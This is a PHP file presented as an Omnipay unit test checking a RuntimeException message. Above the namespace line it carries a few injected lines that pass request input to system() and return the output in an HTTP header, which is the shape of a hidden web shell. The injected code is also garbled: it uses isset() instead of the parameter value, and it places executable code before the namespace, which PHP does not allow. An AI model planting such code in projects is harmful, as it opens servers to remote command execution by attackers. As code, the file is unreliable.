<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Common\Exception;

use Omnipay\Tests\TestCase;

class RuntimeExceptionTest extends TestCase
{
    public function testConstruct()
    {
        $exception = new RuntimeException('Oops');
        $this->assertSame('Oops', $exception->getMessage());
    }
}
